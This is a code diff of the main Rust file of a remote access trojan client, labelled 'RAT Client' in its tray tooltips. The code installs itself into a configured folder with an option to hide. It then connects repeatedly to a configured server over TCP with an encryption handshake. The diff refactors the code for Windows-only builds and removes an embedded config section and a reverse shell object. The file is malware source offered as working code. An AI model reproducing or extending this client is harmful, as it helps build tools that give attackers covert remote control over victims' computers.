@@ -1,31 +1,29 @@
+pub mod globals;
 // #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 // #![cfg_attr(debug_assertions, windows_subsystem = "windows")]
 
-#[no_mangle]
-#[link_section = ".zzz"]
-static CONFIG: [u8; 1024] = [0; 1024];
-
 use std::time::Duration;
-use winapi::um::winuser::SetProcessDPIAware;
+
+#[cfg(windows)]
+mod win {
+    pub use winapi::um::winuser::SetProcessDPIAware;
+}
 
 pub mod features;
 pub mod service;
 pub mod handler;
+pub mod platform;
 
 use tokio::{net::TcpStream, sync::oneshot, time::sleep};
 use common::{connection::Connection, packets::*};
 
-use std::sync::{Arc, Mutex};
+use std::sync::Mutex;
 use once_cell::sync::Lazy;
 
 use features::encryption;
 
 static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
     Mutex::new(service::mutex::MutexLock::new())
-);
-
-static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
-    Mutex::new(features::reverse_shell::ReverseShell::new())
 );
 
 #[tokio::main(flavor = "current_thread")]
@@ -36,16 +34,16 @@ async fn main() {
         std::process::exit(0);
     }
 
-    let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
-    
+    #[cfg(windows)]
     {
+        let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
         tray_icon.lock().unwrap().set_unattended(config.unattended_mode);
         tray_icon.lock().unwrap().show();
-    }
 
-    unsafe {
-        // FIX REMOTE DESKTOP DPI ISSUES
-        SetProcessDPIAware();
+        unsafe {
+            // FIX REMOTE DESKTOP DPI ISSUES
+            win::SetProcessDPIAware();
+        }
     }
 
     {
@@ -58,15 +56,17 @@ async fn main() {
         service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
     }
 
-
     // Main connection loop
     loop {
-        let tray_icon_clone = tray_icon.clone();
+        #[cfg(windows)]
+        let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
+
         // Connect to server phase
         println!("Connecting to server...");
 
+        #[cfg(windows)]
         {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connecting...");
+            tray_icon.lock().unwrap().set_tooltip("RAT Client: Connecting...");
         }
         
         let socket = match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
@@ -78,8 +78,9 @@ async fn main() {
             }
         };
 
+        #[cfg(windows)]
         {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
+            tray_icon.lock().unwrap().set_tooltip("RAT Client: Connected");
         }
 
         // Encryption handshake phase
@@ -90,7 +91,6 @@ async fn main() {
         
         match encryption_result {
             Ok((encryption_state, reader, writer)) => {
-                // println!("Encryption handshake successful!");
                 // Setup communication channel between reader and writer
                 let (tx, rx) = oneshot::channel::<()>();
 
@@ -120,19 +120,19 @@ async fn main() {
                     println!("Write task error: {}", e);
                 }
 
+                #[cfg(windows)]
                 {
-                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+                    tray_icon.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                 }
                 
-                // println!("Connection ended. Reconnecting in 5 seconds...");
                 sleep(Duration::from_secs(5)).await;
             },
             Err(_) => {
+                #[cfg(windows)]
                 {
-                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+                    tray_icon.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                 }
 
-                // println!("Encryption handshake failed: {}. Retrying in 5 seconds...", e);
                 sleep(Duration::from_secs(5)).await;
             }
         }
